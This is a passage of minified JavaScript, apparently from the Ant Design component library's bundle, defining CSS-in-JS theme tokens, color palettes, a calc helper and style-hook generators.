n&&(n.writable=!0),Object.defineProperty(e,rN(n.key),n)}}function rV(e,t,r){return t&&rz(e.prototype,t),r&&rz(e,r),Object.defineProperty(e,"prototype",{writable:!1}),e}function rW(e){if(void 0===e)throw ReferenceError("this hasn't been initialised - super() hasn't been called");return e}function rU(e,t){return(rU=Object.setPrototypeOf?Object.setPrototypeOf.bind():function(e,t){return e.__proto__=t,e})(e,t)}function rq(e,t){if("function"!=typeof t&&null!==t)throw TypeError("Super expression must either be null or a function");e.prototype=Object.create(t&&t.prototype,{constructor:{value:e,writable:!0,configurable:!0}}),Object.defineProperty(e,"prototype",{writable:!1}),t&&rU(e,t)}function rG(e){return(rG=Object.setPrototypeOf?Object.getPrototypeOf.bind():function(e){return e.__proto__||Object.getPrototypeOf(e)})(e)}function rJ(){try{var e=!Boolean.prototype.valueOf.call(Reflect.construct(Boolean,[],function(){}))}catch(e){}return(rJ=function(){return!!e})()}function rX(e){var t=rJ();return function(){var r,n=rG(e);r=t?Reflect.construct(n,arguments,rG(this).constructor):n.apply(this,arguments);if(r&&("object"==r_(r)||"function"==typeof r))return r;if(void 0!==r)throw TypeError("Derived constructors may only return object or undefined");return rW(this)}}e.s(["createTheme",()=>tE],68297),rL(["borderTop","borderBottom"]),rL(["borderTop"]),rL(["borderBottom"]),rL(["borderLeft","borderRight"]),rL(["borderLeft"]),rL(["borderRight"]),e.s([],96059),e.s(["useStyleRegister",()=>rA],99615),e.s(["default",()=>rB],78409),e.s(["default",()=>rV],33848);var rK=rV(function e(){rB(this,e)}),rQ="CALC_UNIT",rY=RegExp(rQ,"g");function rZ(e){return"number"==typeof e?"".concat(e).concat(rQ):e}var r0=function(e){rq(r,e);var t=rX(r);function r(e,n){rB(this,r),rF(rW(o=t.call(this)),"result",""),rF(rW(o),"unitlessCssVar",void 0),rF(rW(o),"lowPriority",void 0);var o,a=r_(e);return o.unitlessCssVar=n,e instanceof r?o.result="(".concat(e.result,")"):"number"===a?o.result=rZ(e):"string"===a&&(o.result=e),o}return rV(r,[{key:"add",value:function(e){return e instanceof r?this.result="".concat(this.result," + ").concat(e.getResult()):("number"==typeof e||"string"==typeof e)&&(this.result="".concat(this.result," + ").concat(rZ(e))),this.lowPriority=!0,this}},{key:"sub",value:function(e){return e instanceof r?this.result="".concat(this.result," - ").concat(e.getResult()):("number"==typeof e||"string"==typeof e)&&(this.result="".concat(this.result," - ").concat(rZ(e))),this.lowPriority=!0,this}},{key:"mul",value:function(e){return this.lowPriority&&(this.result="(".concat(this.result,")")),e instanceof r?this.result="".concat(this.result," * ").concat(e.getResult(!0)):("number"==typeof e||"string"==typeof e)&&(this.result="".concat(this.result," * ").concat(e)),this.lowPriority=!1,this}},{key:"div",value:function(e){return this.lowPriority&&(this.result="(".concat(this.result,")")),e instanceof r?this.result="".concat(this.result," / ").concat(e.getResult(!0)):("number"==typeof e||"string"==typeof e)&&(this.result="".concat(this.result," / ").concat(e)),this.lowPriority=!1,this}},{key:"getResult",value:function(e){return this.lowPriority||e?"(".concat(this.result,")"):this.result}},{key:"equal",value:function(e){var t=this,r=(e||{}).unit,n=!0;return("boolean"==typeof r?n=r:Array.from(this.unitlessCssVar).some(function(e){return t.result.includes(e)})&&(n=!1),this.result=this.result.replace(rY,n?"px":""),void 0!==this.lowPriority)?"calc(".concat(this.result,")"):this.result}}]),r}(rK),r1=function(e){rq(r,e);var t=rX(r);function r(e){var n;return rB(this,r),rF(rW(n=t.call(this)),"result",0),e instanceof r?n.result=e.result:"number"==typeof e&&(n.result=e),n}return rV(r,[{key:"add",value:function(e){return e instanceof r?this.result+=e.result:"number"==typeof e&&(this.result+=e),this}},{key:"sub",value:function(e){return e instanceof r?this.result-=e.result:"number"==typeof e&&(this.result-=e),this}},{key:"mul",value:function(e){return e instanceof r?this.result*=e.result:"number"==typeof e&&(this.result*=e),this}},{key:"div",value:function(e){return e instanceof r?this.result/=e.result:"number"==typeof e&&(this.result/=e),this}},{key:"equal",value:function(){return this.result}}]),r}(rK);let r2=function(e,t){var r="css"===e?r0:r1;return function(e){return new r(e,t)}},r3=function(e,t){return"".concat([t,e.replace(/([A-Z]+)([A-Z][a-z]+)/g,"$1-$2").replace(/([a-z])([A-Z])/g,"$1-$2")].filter(Boolean).join("-"))},r6=function(e,t,r,n){var o=rH({},t[e]);null!=n&&n.deprecatedTokens&&n.deprecatedTokens.forEach(function(e){var t=rO(e,2),r=t[0],n=t[1];(null!=o&&o[r]||null!=o&&o[n])&&(null!=o[n]||(o[n]=null==o?void 0:o[r]))});var a=rH(rH({},r),o);return Object.keys(a).forEach(function(e){a[e]===t[e]&&delete a[e]}),a};var r4="u">typeof CSSINJS_STATISTIC,r5=!0;function r8(){for(var e=arguments.length,t=Array(e),r=0;r<e;r++)t[r]=arguments[r];if(!r4)return Object.assign.apply(Object,[{}].concat(t));r5=!1;var n={};return t.forEach(function(e){"object"===r_(e)&&Object.keys(e).forEach(function(t){Object.defineProperty(n,t,{configurable:!0,enumerable:!0,get:function(){return e[t]}})})}),r5=!0,n}var r7={};function r9(){}let ne=function(e){var t,r=e,n=r9;return r4&&"u">typeof Proxy&&(t=new Set,r=new Proxy(e,{get:function(e,r){if(r5){var n;null==(n=t)||n.add(r)}return e[r]}}),n=function(e,r){var n;r7[e]={global:Array.from(t),component:rH(rH({},null==(n=r7[e])?void 0:n.component),r)}}),{token:r,keys:t,flush:n}},nt=function(e,t,r){if("function"==typeof r){var n;return r(r8(t,null!=(n=t[e])?n:{}))}return null!=r?r:{}};var nr=new(function(){function e(){rB(this,e),rF(this,"map",new Map),rF(this,"objectIDMap",new WeakMap),rF(this,"nextID",0),rF(this,"lastAccessBeat",new Map),rF(this,"accessBeat",0)}return rV(e,[{key:"set",value:function(e,t){this.clear();var r=this.getCompositeKey(e);this.map.set(r,t),this.lastAccessBeat.set(r,Date.now())}},{key:"get",value:function(e){var t=this.getCompositeKey(e),r=this.map.get(t);return this.lastAccessBeat.set(t,Date.now()),this.accessBeat+=1,r}},{key:"getCompositeKey",value:function(e){var t=this;return e.map(function(e){return e&&"object"===r_(e)?"obj_".concat(t.getObjectID(e)):"".concat(r_(e),"_").concat(e)}).join("|")}},{key:"getObjectID",value:function(e){if(this.objectIDMap.has(e))return this.objectIDMap.get(e);var t=this.nextID;return this.objectIDMap.set(e,t),this.nextID+=1,t}},{key:"clear",value:function(){var e=this;if(this.accessBeat>1e4){var t=Date.now();this.lastAccessBeat.forEach(function(r,n){t-r>6e5&&(e.map.delete(n),e.lastAccessBeat.delete(n))}),this.accessBeat=0}}}]),e}());let nn=function(){return{}},no={overflow:"hidden",whiteSpace:"nowrap",textOverflow:"ellipsis"},na=(e,t=!1)=>({boxSizing:"border-box",margin:0,padding:0,color:e.colorText,fontSize:e.fontSize,lineHeight:e.lineHeight,listStyle:"none",fontFamily:t?"inherit":e.fontFamily}),ni=()=>({display:"inline-flex",alignItems:"center",color:"inherit",fontStyle:"normal",lineHeight:0,textAlign:"center",textTransform:"none",verticalAlign:"-0.125em",textRendering:"optimizeLegibility","-webkit-font-smoothing":"antialiased","-moz-osx-font-smoothing":"grayscale","> *":{lineHeight:1},svg:{display:"inline-block"}}),ns=()=>({"&::before":{display:"table",content:'""'},"&::after":{display:"table",clear:"both",content:'""'}}),nl=e=>({a:{color:e.colorLink,textDecoration:e.linkDecoration,backgroundColor:"transparent",outline:"none",cursor:"pointer",transition:`color ${e.motionDurationSlow}`,"-webkit-text-decoration-skip":"objects","&:hover":{color:e.colorLinkHover},"&:active":{color:e.colorLinkActive},"&:active, &:hover":{textDecoration:e.linkHoverDecoration,outline:0},"&:focus":{textDecoration:e.linkFocusDecoration,outline:0},"&[disabled]":{color:e.colorTextDisabled,cursor:"not-allowed"}}}),nc=(e,t,r,n)=>{let o=`[class^="${t}"], [class*=" ${t}"]`,a=r?`.${r}`:o,i={boxSizing:"border-box","&::before, &::after":{boxSizing:"border-box"}},s={};return!1!==n&&(s={fontFamily:e.fontFamily,fontSize:e.fontSize}),{[a]:{...s,...i,[o]:i}}},nu=(e,t)=>({outline:`${tj(e.lineWidthFocus)} solid ${e.colorPrimaryBorder}`,outlineOffset:t??1,transition:["outline-offset","outline"].map(e=>`${e} 0s`).join(", ")}),nd=(e,t)=>({"&:focus-visible":nu(e,t)}),np=e=>({[`.${e}`]:{...ni(),[`.${e} .${e}-icon`]:{display:"block"}}});e.s(["clearFix",0,ns,"genCommonStyle",0,nc,"genFocusOutline",0,nu,"genFocusStyle",0,nd,"genIconStyle",0,np,"genLinkStyle",0,nl,"operationUnit",0,e=>({color:e.colorLink,textDecoration:e.linkDecoration,outline:"none",cursor:"pointer",transition:`all ${e.motionDurationSlow}`,border:0,padding:0,background:"none",userSelect:"none",...nd(e),"&:hover":{color:e.colorLinkHover,textDecoration:e.linkHoverDecoration},"&:focus":{color:e.colorLinkHover,textDecoration:e.linkFocusDecoration},"&:active":{color:e.colorLinkActive,textDecoration:e.linkHoverDecoration}}),"resetComponent",0,na,"resetIcon",0,ni,"textEllipsis",0,no],83293);let nm={blue:"#1677FF",purple:"#722ED1",cyan:"#13C2C2",green:"#52C41A",magenta:"#EB2F96",pink:"#EB2F96",red:"#F5222D",orange:"#FA8C16",yellow:"#FADB14",volcano:"#FA541C",geekblue:"#2F54EB",gold:"#FAAD14",lime:"#A0D911"},nf={...nm,colorPrimary:"#1677ff",colorSuccess:"#52c41a",colorWarning:"#faad14",colorError:"#ff4d4f",colorInfo:"#1677ff",colorLink:"",colorTextBase:"",colorBgBase:"",fontFamily:`-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial,
'Noto Sans', sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol',
'Noto Color Emoji'`,fontFamilyCode:"'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, Courier, monospace",fontSize:14,lineWidth:1,lineType:"solid",motionUnit:.1,motionBase:0,motionEaseOutCirc:"cubic-bezier(0.08, 0.82, 0.17, 1)",motionEaseInOutCirc:"cubic-bezier(0.78, 0.14, 0.15, 0.86)",motionEaseOut:"cubic-bezier(0.215, 0.61, 0.355, 1)",motionEaseInOut:"cubic-bezier(0.645, 0.045, 0.355, 1)",motionEaseOutBack:"cubic-bezier(0.12, 0.4, 0.29, 1.46)",motionEaseInBack:"cubic-bezier(0.71, -0.46, 0.88, 0.6)",motionEaseInQuint:"cubic-bezier(0.755, 0.05, 0.855, 0.06)",motionEaseOutQuint:"cubic-bezier(0.23, 1, 0.32, 1)",borderRadius:6,sizeUnit:4,sizeStep:4,sizePopupArrow:16,controlHeight:32,zIndexBase:0,zIndexPopupBase:1e3,opacityImage:1,wireframe:!1,motion:!0};e.s(["default",0,nf,"defaultPresetColors",0,nm],70517);let ng=["blue","purple","cyan","green","magenta","pink","red","orange","yellow","volcano","geekblue","lime","gold"];function nh(e){return(e+8)/e}function nb(e){let t=Array.from({length:10}).map((t,r)=>{let n=e*Math.E**((r-1)/5);return 2*Math.floor((r>1?Math.floor(n):Math.ceil(n))/2)});return t[1]=e,t.map(e=>({size:e,lineHeight:nh(e)}))}e.s(["PresetColors",0,ng],17933),e.s(["default",()=>nb,"getLineHeight",()=>nh],88317);let ny=(e,t)=>new ed(e).setA(t).toRgbString(),nv=(e,t)=>new ed(e).darken(t).toHexString(),nS=e=>{let t=eh(e);return{1:t[0],2:t[1],3:t[2],4:t[3],5:t[4],6:t[5],7:t[6],8:t[4],9:t[5],10:t[6]}},nx=(e,t)=>{let r=e||"#fff",n=t||"#000";return{colorBgBase:r,colorTextBase:n,colorText:ny(n,.88),colorTextSecondary:ny(n,.65),colorTextTertiary:ny(n,.45),colorTextQuaternary:ny(n,.25),colorFill:ny(n,.15),colorFillSecondary:ny(n,.06),colorFillTertiary:ny(n,.04),colorFillQuaternary:ny(n,.02),colorBgSolid:ny(n,1),colorBgSolidHover:ny(n,.75),colorBgSolidActive:ny(n,.95),colorBgLayout:nv(r,4),colorBgContainer:nv(r,0),colorBgElevated:nv(r,0),colorBgSpotlight:ny(n,.85),colorBgBlur:"transparent",colorBorder:nv(r,15),colorBorderDisabled:nv(r,15),colorBorderSecondary:nv(r,6)}},nC=tE(function(e){let t,r,n,o,a,i,s,l,c;eb.pink=eb.magenta,eR.pink=eR.magenta;let u=Object.keys(nm).map(t=>{let r=e[t]===eb[t]?eR[t]:eh(e[t]);return Array.from({length:10},()=>1).reduce((e,n,o)=>(e[`${t}-${o+1}`]=r[o],e[`${t}${o+1}`]=r[o],e),{})}).reduce((e,t)=>e={...e,...t},{});return{...e,...u,...function(e,{generateColorPalettes:t,generateNeutralColorPalettes:r}){let{colorSuccess:n,colorWarning:o,colorError:a,colorInfo:i,colorPrimary:s,colorBgBase:l,colorTextBase:c}=e,u=t(s),d=t(n),p=t(o),m=t(a),f=t(i),g=r(l,c),h=t(e.colorLink||e.colorInfo),b=new ed(m[1]).mix(new ed(m[3]),50).toHexString(),y={};return ng.forEach(r=>{let n=e[r];if(n){let e=t(n);y[`${r}Hover`]=e[5],y[`${r}Active`]=e[7]}}),{...g,colorPrimaryBg:u[1],colorPrimaryBgHover:u[2],colorPrimaryBorder:u[3],colorPrimaryBorderHover:u[4],colorPrimaryHover:u[5],colorPrimary:u[6],colorPrimaryActive:u[7],colorPrimaryTextHover:u[8],colorPrimaryText:u[9],colorPrimaryTextActive:u[10],colorSuccessBg:d[1],colorSuccessBgHover:d[2],colorSuccessBorder:d[3],colorSuccessBorderHover:d[4],colorSuccessHover:d[4],colorSuccess:d[6],colorSuccessActive:d[7],colorSuccessTextHover:d[8],colorSuccessText:d[9],colorSuccessTextActive:d[10],colorErrorBg:m[1],colorErrorBgHover:m[2],colorErrorBgFilledHover:b,colorErrorBgActive:m[3],colorErrorBorder:m[3],colorErrorBorderHover:m[4],colorErrorHover:m[5],colorError:m[6],colorErrorActive:m[7],colorErrorTextHover:m[8],colorErrorText:m[9],colorErrorTextActive:m[10],colorWarningBg:p[1],colorWarningBgHover:p[2],colorWarningBorder:p[3],colorWarningBorderHover:p[4],colorWarningHover:p[4],colorWarning:p[6],colorWarningActive:p[7],colorWarningTextHover:p[8],colorWarningText:p[9],colorWarningTextActive:p[10],colorInfoBg:f[1],colorInfoBgHover:f[2],colorInfoBorder:f[3],colorInfoBorderHover:f[4],colorInfoHover:f[4],colorInfo:f[6],colorInfoActive:f[7],colorInfoTextHover:f[8],colorInfoText:f[9],colorInfoTextActive:f[10],colorLinkHover:h[4],colorLink:h[6],colorLinkActive:h[7],...y,colorBgMask:new ed("#000").setA(.45).toRgbString(),colorWhite:"#fff"}}(e,{generateColorPalettes:nS,generateNeutralColorPalettes:nx}),...(r=(t=nb(e.fontSize)).map(e=>e.size),n=t.map(e=>e.lineHeight),o=r[1],a=r[0],i=r[2],s=n[1],l=n[0],c=n[2],{fontSizeSM:a,fontSize:o,fontSizeLG:i,fontSizeXL:r[3],fontSizeHeading1:r[6],fontSizeHeading2:r[5],fontSizeHeading3:r[4],fontSizeHeading4:r[3],fontSizeHeading5:r[2],lineHeight:s,lineHeightLG:c,lineHeightSM:l,fontHeight:Math.round(s*o),fontHeightLG:Math.round(c*i),fontHeightSM:Math.round(l*a),lineHeightHeading1:n[6],lineHeightHeading2:n[5],lineHeightHeading3:n[4],lineHeightHeading4:n[3],lineHeightHeading5:n[2]}),...function(e){let{sizeUnit:t,sizeStep:r}=e;return{sizeXXL:t*(r+8),sizeXL:t*(r+4),sizeLG:t*(r+2),sizeMD:t*(r+1),sizeMS:t*r,size:t*r,sizeSM:t*(r-1),sizeXS:t*(r-2),sizeXXS:t*(r-3)}}(e),...(e=>{let{controlHeight:t}=e;return{controlHeightSM:.75*t,controlHeightXS:.5*t,controlHeightLG:1.25*t}})(e),...function(e){let t,r,n,o,{motionUnit:a,motionBase:i,borderRadius:s,lineWidth:l}=e;return{motionDurationFast:`${(i+a).toFixed(1)}s`,motionDurationMid:`${(i+2*a).toFixed(1)}s`,motionDurationSlow:`${(i+3*a).toFixed(1)}s`,lineWidthBold:l+1,...(t=s,r=s,n=s,o=s,s<6&&s>=5?t=s+1:s<16&&s>=6?t=s+2:s>=16&&(t=16),s<7&&s>=5?r=4:s<8&&s>=7?r=5:s<14&&s>=8?r=6:s<16&&s>=14?r=7:s>=16&&(r=8),s<6&&s>=2?n=1:s>=6&&(n=2),s>4&&s<8?o=4:s>=8&&(o=6),{borderRadius:s,borderRadiusXS:n,borderRadiusSM:r,borderRadiusLG:t,borderRadiusOuter:o})}}(e)}});e.s(["defaultTheme",0,nC],10751);let nw={token:nf,override:{override:nf},hashed:!0},nk=b.default.createContext(nw);function n$(e){return e>=0&&e<=255}e.s(["DesignTokenContext",0,nk,"defaultConfig",0,nw],20890);let nE=function(e,t){let{r:r,g:n,b:o,a:a}=new ed(e).toRgb();if(a<1)return e;let{r:i,g:s,b:l}=new ed(t).toRgb();for(let e=.01;e<=1;e+=.01){let t=Math.round((r-i*(1-e))/e),a=Math.round((n-s*(1-e))/e),c=Math.round((o-l*(1-e))/e);if(n$(t)&&n$(a)&&n$(c))return new ed({r:t,g:a,b:c,a:Math.round(100*e)/100}).toRgbString()}return new ed({r:r,g:n,b:o,a:1}).toRgbString()};e.s(["default",0,nE],45978);let nP={lineHeight:!0,lineHeightSM:!0,lineHeightLG:!0,lineHeightHeading1:!0,lineHeightHeading2:!0,lineHeightHeading3:!0,lineHeightHeading4:!0,lineHeightHeading5:!0,opacityLoading:!0,fontWeightStrong:!0,zIndexPopupBase:!0,zIndexBase:!0,opacityImage:!0},nT={motionBase:!0,motionUnit:!0},nI={screenXS:!0,screenXSMin:!0,screenXSMax:!0,screenSM:!0,screenSMMin:!0,screenSMMax:!0,screenMD:!0,screenMDMin:!0,screenMDMax:!0,screenLG:!0,screenLGMin:!0,screenLGMax:!0,screenXL:!0,screenXLMin:!0,screenXLMax:!0,screenXXL:!0,screenXXLMin:!0},nM=(e,t,r)=>{let n=r.getDerivativeToken(e),{override:o,...a}=t,i={...n,override:o};return i=function(e){let{override:t,...r}=e,n={...t};Object.keys(nf).forEach(e=>{delete n[e]});let o={...r,...n};return!1===o.motion&&(o.motionDurationFast="0s",o.motionDurationMid="0s",o.motionDurationSlow="0s"),{...o,colorFillContent:o.colorFillSecondary,colorFillContentHover:o.colorFill,colorFillAlter:o.colorFillQuaternary,colorBgContainerDisabled:o.colorFillTertiary,colorBorderBg:o.colorBgContainer,colorSplit:nE(o.colorBorderSecondary,o.colorBgContainer),colorTextPlaceholder:o.colorTextQuaternary,colorTextDisabled:o.colorTextQuaternary,colorTextHeading:o.colorText,colorTextLabel:o.colorTextSecondary,colorTextDescription:o.colorTextTertiary,colorTextLightSolid:o.colorWhite,colorHighlight:o.colorError,colorBgTextHover:o.colorFillSecondary,colorBgTextActive:o.colorFill,colorIcon:o.colorTextTertiary,colorIconHover:o.colorText,colorErrorOutline:nE(o.colorErrorBg,o.colorBgContainer),colorWarningOutline:nE(o.colorWarningBg,o.colorBgContainer),fontSizeIcon:o.fontSizeSM,lineWidthFocus:3*o.lineWidth,lineWidth:o.lineWidth,controlOutlineWidth:2*o.lineWidth,controlInteractiveSize:o.controlHeight/2,controlItemBgHover:o.colorFillTertiary,controlItemBgActive:o.colorPrimaryBg,controlItemBgActiveHover:o.colorPrimaryBgHover,controlItemBgActiveDisabled:o.colorFill,controlTmpOutline:o.colorFillQuaternary,controlOutline:nE(o.colorPrimaryBg,o.colorBgContainer),lineType:o.lineType,borderRadius:o.borderRadius,borderRadiusXS:o.borderRadiusXS,borderRadiusSM:o.borderRadiusSM,borderRadiusLG:o.borderRadiusLG,fontWeightStrong:600,opacityLoading:.65,linkDecoration:"none",linkHoverDecoration:"none",linkFocusDecoration:"none",controlPaddingHorizontal:12,controlPaddingHorizontalSM:8,paddingXXS:o.sizeXXS,paddingXS:o.sizeXS,paddingSM:o.sizeSM,padding:o.size,paddingMD:o.sizeMD,paddingLG:o.sizeLG,paddingXL:o.sizeXL,paddingContentHorizontalLG:o.sizeLG,paddingContentVerticalLG:o.sizeMS,paddingContentHorizontal:o.sizeMS,paddingContentVertical:o.sizeSM,paddingContentHorizontalSM:o.size,paddingContentVerticalSM:o.sizeXS,marginXXS:o.sizeXXS,marginXS:o.sizeXS,marginSM:o.sizeSM,margin:o.size,marginMD:o.sizeMD,marginLG:o.sizeLG,marginXL:o.sizeXL,marginXXL:o.sizeXXL,boxShadow:`
      0 6px 16px 0 rgba(0, 0, 0, 0.08),
      0 3px 6px -4px rgba(0, 0, 0, 0.12),
      0 9px 28px 8px rgba(0, 0, 0, 0.05)
    `,boxShadowSecondary:`
      0 6px 16px 0 rgba(0, 0, 0, 0.08),
      0 3px 6px -4px rgba(0, 0, 0, 0.12),
      0 9px 28px 8px rgba(0, 0, 0, 0.05)
    `,boxShadowTertiary:`
      0 1px 2px 0 rgba(0, 0, 0, 0.03),
      0 1px 6px -1px rgba(0, 0, 0, 0.02),
      0 2px 4px 0 rgba(0, 0, 0, 0.02)
    `,screenXS:480,screenXSMin:480,screenXSMax:575,screenSM:576,screenSMMin:576,screenSMMax:767,screenMD:768,screenMDMin:768,screenMDMax:991,screenLG:992,screenLGMin:992,screenLGMax:1199,screenXL:1200,screenXLMin:1200,screenXLMax:1599,screenXXL:1600,screenXXLMin:1600,screenXXLMax:1919,screenXXXL:1920,screenXXXLMin:1920,boxShadowPopoverArrow:"2px 2px 5px rgba(0, 0, 0, 0.05)",boxShadowCard:`
      0 1px 2px -2px ${new ed("rgba(0, 0, 0, 0.16)").toRgbString()},
      0 3px 6px 0 ${new ed("rgba(0, 0, 0, 0.12)").toRgbString()},
      0 5px 12px 4px ${new ed("rgba(0, 0, 0, 0.09)").toRgbString()}
    `,boxShadowDrawerRight:`
      -6px 0 16px 0 rgba(0, 0, 0, 0.08),
      -3px 0 6px -4px rgba(0, 0, 0, 0.12),
      -9px 0 28px 8px rgba(0, 0, 0, 0.05)
    `,boxShadowDrawerLeft:`
      6px 0 16px 0 rgba(0, 0, 0, 0.08),
      3px 0 6px -4px rgba(0, 0, 0, 0.12),
      9px 0 28px 8px rgba(0, 0, 0, 0.05)
    `,boxShadowDrawerUp:`
      0 6px 16px 0 rgba(0, 0, 0, 0.08),
      0 3px 6px -4px rgba(0, 0, 0, 0.12),
      0 9px 28px 8px rgba(0, 0, 0, 0.05)
    `,boxShadowDrawerDown:`
      0 -6px 16px 0 rgba(0, 0, 0, 0.08),
      0 -3px 6px -4px rgba(0, 0, 0, 0.12),
      0 -9px 28px 8px rgba(0, 0, 0, 0.05)
    `,boxShadowTabsOverflowLeft:"inset 10px 0 8px -8px rgba(0, 0, 0, 0.08)",boxShadowTabsOverflowRight:"inset -10px 0 8px -8px rgba(0, 0, 0, 0.08)",boxShadowTabsOverflowTop:"inset 0 10px 8px -8px rgba(0, 0, 0, 0.08)",boxShadowTabsOverflowBottom:"inset 0 -10px 8px -8px rgba(0, 0, 0, 0.08)",...n}}(i),a&&Object.entries(a).forEach(([e,t])=>{let{theme:r,...n}=t,o=n;r&&(o=nM({...i,...n},{override:n},r)),i[e]=o}),i};function nR(){let{token:e,hashed:t,theme:r,override:n,cssVar:o,zeroRuntime:a}=b.default.useContext(nk),{csp:i}=b.default.useContext(ee),s={prefix:o?.prefix??"ant",key:o?.key??"css-var-root"},l=r||nC,[c,u,d]=function(e,t,r){let{cache:{instanceId:n},container:o,hashPriority:a}=(0,b.useContext)(tx),{salt:i="",override:s=tJ,formatToken:l,getComputedToken:c,cssVar:u,nonce:d}=r,p=tI(()=>Object.assign({},...t),t),m=tR(p),f=tR(s),g=tR(u);return tG("token",[i,e.id,m,f,g],()=>{var t;let r,n=c?c(p,s,e):(r={...e.getDerivativeToken(p),...s},l&&(r=l(r)),r),o={...n},d=`${i}_${u.prefix}`,m=td(d),f=`css-${m}`;o._tokenKey=tA(o,d);let[g,h]=tU(n,u.key,{prefix:u.prefix,ignore:u.ignore,unitless:u.unitless,preserve:u.preserve,hashPriority:a,hashCls:u.hashed?f:void 0});return g._hashId=m,t=u.key,tX.set(t,(tX.get(t)||0)+1),[g,f,o,h,u.key]},([,,,,e])=>{let t;tX.set(e,(tX.get(e)||0)-1),t=new Set,tX.forEach((e,r)=>{e<=0&&t.add(r)}),tX.size-t.size>-1&&t.forEach(e=>{"u">typeof document&&document.querySelectorAll(`style[${tb}="${e}"]`).forEach(e=>{e[tv]===n&&e.parentNode?.removeChild(e)}),tX.delete(e)})},([,,,e,t])=>{if(!e)return;let r={mark:ty,prepend:"queue",attachTo:o,priority:-999};r=tV(r,d);let a=e1(e,td(`css-var-${t}`),r);a[tv]=n,a.setAttribute(tb,t)})}(l,[nf,e],{salt:`6.3.2-${t||""}`,override:n,getComputedToken:nM,cssVar:{...s,unitless:nP,ignore:nT,preserve:nI},nonce:i?.nonce});return[l,d,t?u:"",c,s,!!a]}e.s(["default",()=>nR,"unitless",0,nP],19581);let{genStyleHooks:nA,genComponentStyleHook:nD,genSubStyleComponent:nL}=function(e){var t=e.useCSP,r=void 0===t?nn:t,n=e.useToken,o=e.usePrefix,a=e.getResetStyles,i=e.getCommonStyle,s=e.getCompUnitless;function l(t,s,l){var c=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{},u=Array.isArray(t)?t:[t,t],d=rO(u,1)[0],p=u.join("-"),m=e.layer||{name:"antd"};return function(e){var t,u,f=arguments.length>1&&void 0!==arguments[1]?arguments[1]:e,g=n(),h=g.theme,y=g.realToken,v=g.hashId,S=g.token,x=g.cssVar,C=g.zeroRuntime;if((0,b.useMemo)(function(){return C},[]))return v;var w=o(),k=w.rootPrefixCls,$=w.iconPrefixCls,E=r(),P=(t=function(){var e=new Set;return Object.keys(c.unitless||{}).forEach(function(t){e.add(tW(t,x.prefix)),e.add(tW(t,r3(d,x.prefix)))}),r2("css",e)},u=["css",d,null==x?void 0:x.prefix],b.default.useMemo(function(){var e=nr.get(u);if(e)return e;var r=t();return nr.set(u,r),r},u)),T=function(){for(var e=arguments.length,t=Array(e),r=0;r<e;r++)t[r]=arguments[r];return"max(".concat(t.map(function(e){return tj(e)}).join(","),")")},I=function(){for(var e=arguments.length,t=Array(e),r=0;r<e;r++)t[r]=arguments[r];return"min(".concat(t.map(function(e){return tj(e)}).join(","),")")},M={theme:h,token:S,hashId:v,nonce:function(){return E.nonce},clientOnly:c.clientOnly,layer:m,order:c.order||-999};return"function"==typeof a&&rA(rH(rH({},M),{},{clientOnly:!1,path:["Shared",k]}),function(){return a(S,{prefix:{rootPrefixCls:k,iconPrefixCls:$},csp:E})}),rA(rH(rH({},M),{},{path:[p,e,$]}),function(){if(!1===c.injectStyle)return[];var t=ne(S),r=t.token,n=t.flush,o=nt(d,y,l),a=".".concat(e),u=r6(d,y,o,{deprecatedTokens:c.deprecatedTokens});o&&"object"===r_(o)&&Object.keys(o).forEach(function(e){o[e]="var(".concat(tW(e,r3(d,x.prefix)),")")});var p=r8(r,{componentCls:a,prefixCls:e,iconCls:".".concat($),antCls:".".concat(k),calc:P,max:T,min:I},o),m=s(p,{hashId:v,prefixCls:e,rootPrefixCls:k,iconPrefixCls:$});n(d,u);var g="function"==typeof i?i(p,e,f,c.resetFont):null;return[!1===c.resetStyle?null:g,m]}),v}}return{genStyleHooks:function(e,t,o,a){var i,c,u,d,m,f,g=Array.isArray(e)?e[0]:e;function h(e){return"".concat(String(g)).concat(e.slice(0,1).toUpperCase()).concat(e.slice(1))}var y=(null==a?void 0:a.unitless)||{},v=rH(rH({},"function"==typeof s?s(e):{}),{},rF({},h("zIndexPopup"),!0));Object.keys(y).forEach(function(e){v[h(e)]=y[e]});var S=rH(rH({},a),{},{unitless:v,prefixToken:h}),x=l(e,t,o,S),C=(i=g,c=o,d=(u=S).unitless,m=u.prefixToken,f=u.ignore,function(e){var t=n(),o=t.cssVar,a=t.realToken,s=r();return((e,t)=>{let{key:r,prefix:n,unitless:o,ignore:a,token:i,hashId:s,scope:l,nonce:c}=e,{cache:{instanceId:u},container:d,hashPriority:p}=(0,b.useContext)(tx),{_tokenKey:m}=i,f=Array.isArray(l)?l.join("@@"):l,g=[...e.path,r,f,m];return tG("cssVar",g,()=>{let[e,i]=tU(t(),r,{prefix:n,unitless:o,ignore:a,scope:l,hashPriority:p,hashCls:s}),c=rR(g,i);return[e,i,c,r]},([,,e])=>{tF&&e0(e,{mark:ty,attachTo:d})},([,e,t])=>{if(!e)return;let n={mark:ty,prepend:"queue",attachTo:d,priority:-999},o=e1(e,t,n=tV(n,c));o[tv]=u,o.setAttribute(tb,r)})})({path:[i],prefix:o.prefix,key:o.key,unitless:d,ignore:f,token:a,scope:e,nonce:function(){return s.nonce}},function(){var e=nt(i,a,c),t=r6(i,a,e,{deprecatedTokens:null==u?void 0:u.deprecatedTokens});return e&&Object.keys(e).forEach(function(e){t[m(e)]=t[e],delete t[e]}),t}),null==o?void 0:o.key});return function(e){var t=arguments.length>1&&void 0!==arguments[1]?arguments[1]:e,r=x(e,t),n=null==a?void 0:a.extraCssVarPrefixCls,o="function"==typeof n?n({prefixCls:e,rootCls:t}):n;return[r,C(null!=o&&o.length?[t].concat(p(o)):t)]}},genSubStyleComponent:function(e,t,r){var n=arguments.length>3&&void 0!==arguments[3]?arguments[3]:{},o=l(e,t,r,rH({resetStyle:!1,order:-998},n));return function(e){var t=e.prefixCls,r=e.rootCls,n=void 0===r?t:r;return 